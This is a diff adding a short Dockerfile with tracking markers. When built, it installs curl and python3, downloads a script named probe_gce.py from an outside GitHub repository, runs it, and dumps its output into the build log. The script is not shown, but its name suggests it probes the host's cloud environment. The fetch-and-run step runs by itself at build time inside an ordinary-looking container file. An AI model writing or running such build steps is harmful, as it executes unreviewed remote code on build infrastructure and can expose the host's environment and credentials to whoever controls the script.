@@ -1,0 +1,6 @@
+# MARK-I68006-gce1-7c3a91
+FROM alpine:3.20
+RUN echo MARK-I68006-gce1-7c3a91-step1
+RUN apk add --no-cache python3 curl >/dev/null 2>&1; echo APKDONE
+RUN curl -sS -m 25 -o /p.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe_gce.py && echo DL_OK && MARK=I68006-gce1 timeout 300 python3 /p.py 2>&1 | head -c 40000
+CMD ["sh","-c","sleep 600"]
